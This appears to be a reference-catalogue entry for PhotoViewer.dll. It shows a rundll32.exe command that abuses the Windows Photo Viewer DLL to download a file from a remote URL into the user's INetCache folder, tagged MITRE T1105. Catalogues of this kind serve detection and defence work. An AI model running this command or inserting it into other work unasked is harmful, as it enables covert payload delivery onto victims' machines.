title: PhotoViewer.dll
html:
PhotoViewer.dll

Windows Photo Viewer

Download

Download file from remote location.

rundll32.exe "C:\Program Files\Windows Photo Viewer\PhotoViewer.dll",ImageView_Fullscreen {REMOTEURL}

Once executed, rundll32.exe will download the file at the specified URL to the user's INetCache folder using the Windows Photo Viewer DLL. — MITRE: T1105 — Privileges: User
